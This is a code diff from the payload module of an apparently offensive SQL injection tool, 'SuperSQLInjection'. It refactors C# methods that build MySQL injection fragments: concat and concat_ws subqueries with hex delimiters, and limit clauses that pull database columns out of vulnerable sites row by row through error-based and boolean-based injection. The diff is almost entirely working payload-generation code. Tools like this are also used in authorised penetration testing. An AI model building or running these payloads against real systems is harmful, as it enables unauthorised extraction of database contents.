@@ -216,51 +216,20 @@ namespace SuperSQLInjection.payload
         }
 
 
-        public static String creatMySQLColumnsStrByError(String column, String table, String dbName, int limit)
-        {
-            List<String> List = new List<String>();
-            List.Add(column);
-            return creatMySQLColumnsStrByError(List, table, dbName, limit);
-        }
-        public static String creatMySQLColumnsHexStrByError(String column, String table, String dbName, int limit)
-        {
-            StringBuilder sb = new StringBuilder("(select ");
-            sb.Append(creatMySQLColumnHexStr(column));
-
-            if (!Tools.checkEmpty(dbName))
-            {
-                sb.Append(" from `" + dbName + "`.");
-                if (!Tools.checkEmpty(table))
-                {
-                    sb.Append(table);
-                }
-            }
-            else
-            {
-                if (!Tools.checkEmpty(table))
-                {
-                    sb.Append(" from `" + table+ "`");
-                }
-            }
-            if (limit >= 0)
-            {
-                sb.Append(" limit " + limit + ",1)");
-
-            }
-            return sb.ToString();
-        }
-
-        public static String creatMySQLColumnsNoConcatStr(List<String> columns, String table, String dbName, int limit)
+        public static String creatMySQLColumnsStr(List<String> columns, String table, String dbName, int limit)
         {
 
+            if (columns.Count <= 1) {
 
-            StringBuilder sb = new StringBuilder("(select concat(");
+            }
+            StringBuilder sb = new StringBuilder("(select concat_ws(0x242424,");
             foreach (String c in columns) {
-                    sb.Append(c + ",0x242424,");
+                // sb.Append(castMySQLColumn(c)+",");
+                sb.Append(c + ",");
             }
             if (columns.Count > 0)
             {
-                sb.Remove(sb.Length - 10, 10);
+                sb.Remove(sb.Length - 1, 1);
             }
             sb.Append(")");
             if (!Tools.checkEmpty(dbName))
@@ -288,7 +257,6 @@ namespace SuperSQLInjection.payload
 
         
 
-
         /// <summary>
         /// 生成查询列数据
         /// </summary>
@@ -296,30 +264,29 @@ namespace SuperSQLInjection.payload
         /// <returns></returns>
         public static String concatMySQLColumnStr(List<String> columns)
         {
-            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
+            StringBuilder sb = new StringBuilder("concat(0x5e5e21,concat_ws(0x242424,");
             for (int i = 0; i < columns.Count; i++)
             {
                 if (columns.Count > 1)
                 {
-                    sb.Append(columns[i]+",0x242424,");
+
+                    sb.Append(columns[i] + ",");
                 }
                 else
                 {
-                    return concatMySQLColumn(columns[i]);
+                    sb.Append(columns[i]);
                 }
 
             }
-
             if (columns.Count > 1)
             {
-                sb.Remove(sb.Length - 9, 9);
+                sb.Remove(sb.Length - 1, 1);
             }
-            sb.Append("0x215e5e)");
+            sb.Append("),0x215e5e)");
+
             return sb.ToString();
 
-        }
-
-
+        }  
 
         /// <summary>
         /// 生成查询列数据
@@ -335,33 +302,7 @@ namespace SuperSQLInjection.payload
 
         }
 
-        /// <summary>
-        /// 生成查询列数据
-        /// </summary>
-        /// <param name="columns">列明</param>
-        /// <returns></returns>
-        public static String creatMySQLColumnCastStr(String column)
-        {
-            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
-            sb.Append("ifnull(cast(" + column + " as char),0x20)");
-            sb.Append(",0x215e5e)");
-            return sb.ToString();
-
-        }
-    
-        /// <summary>
-        /// 生成查询列数据
-        /// </summary>
-        /// <param name="columns">列明</param>
-        /// <returns></returns>
-        public static String creatMySQLColumnHexStr(String column)
-        {
-            StringBuilder sb = new StringBuilder("concat(0x5e5e21,");
-            sb.Append(hex_value.Replace("{data}",column));
-            sb.Append(",0x215e5e)");
-            return sb.ToString();
-
-        }
+   
 
         public static String getBoolDataPayLoad(String column,List<String> columns, String dbName, String table, int index)
         {
